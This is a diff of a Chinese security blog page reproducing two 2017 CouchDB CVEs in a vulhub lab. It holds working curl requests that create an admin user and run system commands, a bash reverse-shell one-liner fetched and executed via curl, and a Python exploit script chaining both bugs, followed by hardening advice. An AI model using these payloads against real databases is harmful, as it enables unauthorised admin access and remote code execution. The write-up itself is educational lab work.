@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="Hexo, NexT" />
+  <meta name="keywords" content="CVE," />
 
 
 
@@ -81,13 +81,26 @@
 
 
 
-<meta property="og:type" content="website">
-<meta property="og:title" content="Lhaihai&#39;s Blog">
-<meta property="og:url" content="http://blog.Lhaihai.wang/categories/whalectf/index.html">
+<meta name="description" content="复现地址： http://vulhub.org/#/environments/couchdb/CVE-2017-12635/ http://vulhub.org/#/environments/couchdb/CVE-2017-12636/ i春秋有实验，不用自己搭，但是慢。I春秋的实验指导还是可以看一下的 https://www.ichunqiu.com/course/60383 背景 Apach">
+<meta name="keywords" content="CVE">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CouchDB的两个CVE复现">
+<meta property="og:url" content="http://blog.Lhaihai.wang/2018/07/09/CouchDB的两个CVE复现/index.html">
 <meta property="og:site_name" content="Lhaihai&#39;s Blog">
+<meta property="og:description" content="复现地址： http://vulhub.org/#/environments/couchdb/CVE-2017-12635/ http://vulhub.org/#/environments/couchdb/CVE-2017-12636/ i春秋有实验，不用自己搭，但是慢。I春秋的实验指导还是可以看一下的 https://www.ichunqiu.com/course/60383 背景 Apach">
 <meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/couchdb/1531041179054.png">
+<meta property="og:image" content="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/couchdb/1531041197097.png">
+<meta property="og:image" content="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/couchdb/1531102040955.png">
+<meta property="og:image" content="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/couchdb/1531103581867.png">
+<meta property="og:image" content="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/couchdb/1531103757607.png">
+<meta property="og:image" content="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/couchdb/1531111709563.png">
+<meta property="og:image" content="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/couchdb/1531111818648.png">
+<meta property="og:updated_time" content="2018-07-09T05:57:07.856Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Lhaihai&#39;s Blog">
+<meta name="twitter:title" content="CouchDB的两个CVE复现">
+<meta name="twitter:description" content="复现地址： http://vulhub.org/#/environments/couchdb/CVE-2017-12635/ http://vulhub.org/#/environments/couchdb/CVE-2017-12636/ i春秋有实验，不用自己搭，但是慢。I春秋的实验指导还是可以看一下的 https://www.ichunqiu.com/course/60383 背景 Apach">
+<meta name="twitter:image" content="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/couchdb/1531041179054.png">
 
 
 
@@ -117,13 +130,13 @@
 
 
 
-  <link rel="canonical" href="http://blog.Lhaihai.wang/categories/whalectf/"/>
+  <link rel="canonical" href="http://blog.Lhaihai.wang/2018/07/09/CouchDB的两个CVE复现/"/>
 
 
 
 
 
-  <title>分类: whalectf | Lhaihai's Blog</title>
+  <title>CouchDB的两个CVE复现 | Lhaihai's Blog</title>
   
 
 
@@ -153,7 +166,7 @@
   
   <script type="text/javascript" color="0,0,255" opacity='0.7' zIndex="-2" count="10" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
  
-  <div class="container sidebar-position-left ">
+  <div class="container sidebar-position-left page-post-detail">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -283,55 +296,228 @@
           <div id="content" class="content">
             
 
-  
-  
-  
-  <div class="post-block category">
+  <div id="posts" class="posts-expand">
+    
 
-    <div id="posts" class="posts-collapse">
-      <div class="collection-title">
-        <h1>whalectf<small>分类</small>
-        </h1>
-      </div>
+  
 
-      
-        
+  
+  
+  
 
   <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://blog.Lhaihai.wang/2018/07/09/CouchDB的两个CVE复现/">
 
-      <h2 class="post-title">
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Lhaihai">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Lhaihai's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
         
-            <a class="post-title-link" href="/2018/05/10/第一周/" itemprop="url">
-              
-                <span itemprop="name">第一周RSA加密解密入门</span>
-              
-            </a>
         
-      </h2>
+          <h1 class="post-title" itemprop="name headline">CouchDB的两个CVE复现</h1>
+        
 
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2018-05-10T23:05:34+08:00"
-              content="2018-05-10" >
-          05-10
-        </time>
-      </div>
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-07-09T13:57:06+08:00">
+                2018-07-09
+              </time>
+            
 
-    </header>
-  </article>
+            
 
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Web安全/" itemprop="url" rel="index">
+                    <span itemprop="name">Web安全</span>
+                  </a>
+                </span>
+
+                
+                
+                  ， 
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Web安全/数据库/" itemprop="url" rel="index">
+                    <span itemprop="name">数据库</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o">本文总阅读量</i>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>次
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>复现地址：</p>
+<p><a href="http://vulhub.org/#/environments/couchdb/CVE-2017-12635/" target="_blank" rel="noopener">http://vulhub.org/#/environments/couchdb/CVE-2017-12635/</a></p>
+<p><a href="http://vulhub.org/#/environments/couchdb/CVE-2017-12636/" target="_blank" rel="noopener">http://vulhub.org/#/environments/couchdb/CVE-2017-12636/</a></p>
+<p>i春秋有实验，不用自己搭，但是慢。I春秋的实验指导还是可以看一下的</p>
+<p><a href="https://www.ichunqiu.com/course/60383" target="_blank" rel="noopener">https://www.ichunqiu.com/course/60383</a></p>
+<h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><hr>
+<p>Apache CouchDB是一个开源数据库，专注于易用性和成为”完全拥抱web的数据库”。它是一个使用JSON作为存储格式，JavaScript作为查询语言，MapReduce和HTTP作为API的NoSQL数据库。应用广泛，如BBC用在其动态内容展示平台，Credit Suisse用在其内部的商品部门的市场框架，Meebo，用在其社交平台（web和应用程序）。</p>
+<a id="more"></a>
+<h3 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><hr>
+<p>CVE-2017-12635是由于Erlang和JavaScript对JSON解析方式的不同，导致语句执行产生差异性导致的。这个漏洞可以让任意用户创建管理员，属于垂直权限绕过漏洞。 </p>
+<p>CVE-2017-12636是一个任意命令执行漏洞，我们可以通过config api修改couchdb的配置<code>query_server</code>，这个配置项在设计、执行view的时候将被运行。 </p>
+<p>影响版本：小于 1.7.0 以及 小于 2.1.1 </p>
+<h3 id="Couchdb-垂直权限绕过漏洞（CVE-2017-12635）"><a href="#Couchdb-垂直权限绕过漏洞（CVE-2017-12635）" class="headerlink" title="Couchdb 垂直权限绕过漏洞（CVE-2017-12635）"></a>Couchdb 垂直权限绕过漏洞（CVE-2017-12635）</h3><hr>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X PUT -d &apos;&#123;&quot;type&quot;:&quot;user&quot;,&quot;name&quot;:&quot;vulhub&quot;,&quot;roles&quot;:[&quot;_admin&quot;],&quot;roles&quot;:[],&quot;password&quot;:&quot;123456&quot;&#125;&apos; 192.168.190.128:5984/_users/org.couchdb.user:vulhub -H &quot;Content-Type:application/json&quot;</span><br></pre></td></tr></table></figure>
+<p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/couchdb/1531041179054.png" alt="1531041179054"></p>
+<p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/couchdb/1531041197097.png" alt="1531041197097"></p>
+<h3 id="Couchdb-任意命令执行漏洞（CVE-2017-12636）"><a href="#Couchdb-任意命令执行漏洞（CVE-2017-12636）" class="headerlink" title="Couchdb 任意命令执行漏洞（CVE-2017-12636）"></a>Couchdb 任意命令执行漏洞（CVE-2017-12636）</h3><hr>
+<p>CVE-2017-12636漏洞在于CouchDB自身的设计问题，CouchDB在<code>query_server</code>中引入了外部的二进制程序来执行命令，我们可以通过CouchDB自身提供的<code>Restful API</code>接口动态修改保存配置，从而执行系统命令 </p>
+<h4 id="Couchdb-1-6-0环境："><a href="#Couchdb-1-6-0环境：" class="headerlink" title="Couchdb 1.6.0环境："></a>Couchdb 1.6.0环境：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl -X PUT &apos;http://vulhub:vulhub@192.168.190.128:5984/_config/query_servers/cmd&apos; -d &apos;&quot;id &gt;/tmp/success&quot;&apos;</span><br><span class="line">curl -X PUT &apos;http://vulhub:vulhub@192.168.190.128:5984/vultest&apos;</span><br><span class="line">curl -X PUT &apos;http://vulhub:vulhub@192.168.190.128:5984/vultest/vul&apos; -d &apos;&#123;&quot;_id&quot;:&quot;770895a97726d5ca6d70a22173005c7b&quot;&#125;&apos;</span><br><span class="line">curl -X POST &apos;http://vulhub:vulhub@192.168.190.128:5984/vultest/_temp_view?limit=10&apos; -d &apos;&#123;&quot;language&quot;:&quot;cmd&quot;,&quot;map&quot;:&quot;&quot;&#125;&apos; -H &apos;Content-Type:application/json&apos;</span><br></pre></td></tr></table></figure>
+<p>其中,<code>vulhub:vulhub</code>为管理员账号密码。</p>
+<p>第一个请求是添加一个名字为<code>cmd</code>的<code>query_servers</code>，其值为<code>&quot;id &gt;/tmp/success&quot;</code>，这就是我们后面待执行的命令。</p>
+<p>第二、三个请求是添加一个Database和Document，这里添加了后面才能查询。</p>
+<p>第四个请求就是在这个Database里进行查询，因为我将language设置为<code>cmd</code>，这里就会用到我第一步里添加的名为<code>cmd</code>的<code>query_servers</code>，最后触发命令执行。</p>
+<p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/couchdb/1531102040955.png" alt="1531102040955"></p>
+<h4 id="Couchdb-2-1-0环境："><a href="#Couchdb-2-1-0环境：" class="headerlink" title="Couchdb 2.1.0环境："></a>Couchdb 2.1.0环境：</h4><p>启动docker</p>
+<p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/couchdb/1531103581867.png" alt="1531103581867"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">curl http://vulhub:vulhub@your-ip:5984/_membership</span><br><span class="line">curl -X PUT http://vulhub:vulhub@your-ip:5984/_node/nonode@nohost/_config/query_servers/cmd -d &apos;&quot;id &gt;/tmp/success&quot;&apos;</span><br><span class="line">curl -X PUT &apos;http://vulhub:vulhub@your-ip:5984/vultest&apos;</span><br><span class="line">curl -X PUT &apos;http://vulhub:vulhub@your-ip:5984/vultest/vul&apos; -d &apos;&#123;&quot;_id&quot;:&quot;770895a97726d5ca6d70a22173005c7b&quot;&#125;&apos;</span><br><span class="line">curl -X PUT http://vulhub:vulhub@your-ip:5984/vultest/_design/vul -d &apos;&#123;&quot;_id&quot;:&quot;_design/test&quot;,&quot;views&quot;:&#123;&quot;wooyun&quot;:&#123;&quot;map&quot;:&quot;&quot;&#125; &#125;,&quot;language&quot;:&quot;cmd&quot;&#125;&apos; -H &quot;Content-Type: application/json&quot;</span><br></pre></td></tr></table></figure>
+<p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/couchdb/1531103757607.png" alt="1531103757607"></p>
+<h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h4><p>注意：反弹Shell的命令，在经过数据库处理时被截断，不能直接执行，遂此处分为两步去实现（还有其他方法，仁者见仁） 。</p>
+<p>终于知道为啥我直接反弹shell不成功了，瞎搞半天。</p>
+<p>在/home/目录下 新建index.html，内容为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.190.128/9000 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+<p>终端运行，端口被占用了就换个端口</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer 8013</span><br></pre></td></tr></table></figure>
+<p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/couchdb/1531111709563.png" alt="1531111709563"></p>
+<p>curl 或者 p牛的代码执行下面两条command，</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl 192.168.190.128:8013/ -o /tmp/bashshell</span><br><span class="line">bash /tmp/bashshell</span><br></pre></td></tr></table></figure>
+<p>反弹shell成功</p>
+<p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/couchdb/1531111818648.png" alt="1531111818648"></p>
+<p>p牛代码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time    : 2018/7/8</span></span><br><span class="line"><span class="comment"># @Author  : Lhaihai</span></span><br><span class="line"><span class="comment"># @File    : Couchdb-Exp</span></span><br><span class="line"><span class="comment"># @Software: PyCharm</span></span><br><span class="line"><span class="comment"># @Blog    : http://blog.Lhaihai.wang</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">    Description : </span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> requests.auth <span class="keyword">import</span> HTTPBasicAuth</span><br><span class="line"></span><br><span class="line">target = <span class="string">'http://192.168.190.128:5984'</span></span><br><span class="line"><span class="comment"># command = '"bash -i &gt;&amp; /dev/tcp/192.168.190.128/12000 0&gt;&amp;1"'</span></span><br><span class="line"><span class="comment"># command = '"curl 192.168.190.128:8013/ -o /tmp/bashshell"'</span></span><br><span class="line"><span class="comment"># command = '"bash /tmp/bashshell"'</span></span><br><span class="line">version = <span class="number">2</span></span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line">session.headers = &#123;</span><br><span class="line">    <span class="string">'Content-Type'</span>: <span class="string">'application/json'</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># session.proxies = &#123;</span></span><br><span class="line"><span class="comment">#     'http': 'http://127.0.0.1:8085'</span></span><br><span class="line"><span class="comment"># &#125;</span></span><br><span class="line">session.put(target + <span class="string">'/_users/org.couchdb.user:wooyun'</span>, data=<span class="string">'''&#123;</span></span><br><span class="line"><span class="string">  "type": "user",</span></span><br><span class="line"><span class="string">  "name": "wooyun",</span></span><br><span class="line"><span class="string">  "roles": ["_admin"],</span></span><br><span class="line"><span class="string">  "roles": [],</span></span><br><span class="line"><span class="string">  "password": "wooyun"</span></span><br><span class="line"><span class="string">&#125;'''</span>)</span><br><span class="line"></span><br><span class="line">session.auth = HTTPBasicAuth(<span class="string">'wooyun'</span>, <span class="string">'wooyun'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> version == <span class="number">1</span>:</span><br><span class="line">    session.put(target + (<span class="string">'/_config/query_servers/cmd'</span>), data=command)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    host = session.get(target + <span class="string">'/_membership'</span>).json()[<span class="string">'all_nodes'</span>][<span class="number">0</span>]</span><br><span class="line">    session.put(target + <span class="string">'/_node/&#123;&#125;/_config/query_servers/cmd'</span>.format(host), data=command)</span><br><span class="line"></span><br><span class="line">session.put(target + <span class="string">'/wooyun'</span>)</span><br><span class="line">session.put(target + <span class="string">'/wooyun/test'</span>, data=<span class="string">'&#123;"_id": "wooyuntest"&#125;'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> version == <span class="number">1</span>:</span><br><span class="line">    session.post(target + <span class="string">'/wooyun/_temp_view?limit=10'</span>, data=<span class="string">'&#123;"language":"cmd","map":""&#125;'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    session.put(target + <span class="string">'/wooyun/_design/test'</span>, data=<span class="string">'&#123;"_id":"_design/test","views":&#123;"wooyun":&#123;"map":""&#125; &#125;,"language":"cmd"&#125;'</span>)</span><br></pre></td></tr></table></figure>
+<h3 id="漏洞修复建议："><a href="#漏洞修复建议：" class="headerlink" title="漏洞修复建议："></a><strong>漏洞修复建议</strong>：</h3><hr>
+<p>1、指定CouchDB绑定的IP （需要重启CouchDB才能生效） 在<code>/etc/couchdb/local.ini</code>文件中找到 <code>“bind_address = 0.0.0.0”</code> ，把 <code>0.0.0.0</code>修改为 <code>127.0.0.1</code> ，然后保存。注：修改后只有本机才能访问CouchDB。</p>
+<p>2、设置访问密码 （需要重启CouchDB才能生效） 在 <code>/etc/couchdb/local.ini</code> 中找到“[admins]”字段配置密码。</p>
 
       
     </div>
+    
+    
+    
 
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/CVE/" rel="tag"># CVE</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/07/08/Linux反弹shell解析和总结/" rel="next" title="Linux反弹shell解析和总结">
+                <i class="fa fa-chevron-left"></i> Linux反弹shell解析和总结
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
   </div>
   
   
   
+  </article>
 
-  
 
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
 
 
           </div>
@@ -339,6 +525,10 @@
 
 
           
+
+  
+
+
 
         </div>
         
@@ -359,8 +549,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -441,6 +640,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#背景"><span class="nav-number">1.</span> <span class="nav-text">背景</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞概述"><span class="nav-number">2.</span> <span class="nav-text">漏洞概述</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Couchdb-垂直权限绕过漏洞（CVE-2017-12635）"><span class="nav-number">3.</span> <span class="nav-text">Couchdb 垂直权限绕过漏洞（CVE-2017-12635）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Couchdb-任意命令执行漏洞（CVE-2017-12636）"><span class="nav-number">4.</span> <span class="nav-text">Couchdb 任意命令执行漏洞（CVE-2017-12636）</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Couchdb-1-6-0环境："><span class="nav-number">4.1.</span> <span class="nav-text">Couchdb 1.6.0环境：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Couchdb-2-1-0环境："><span class="nav-number">4.2.</span> <span class="nav-text">Couchdb 2.1.0环境：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#反弹shell"><span class="nav-number">4.3.</span> <span class="nav-text">反弹shell</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞修复建议："><span class="nav-number">5.</span> <span class="nav-text">漏洞修复建议：</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
@@ -609,6 +824,10 @@
   
 
   
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
 
   
 
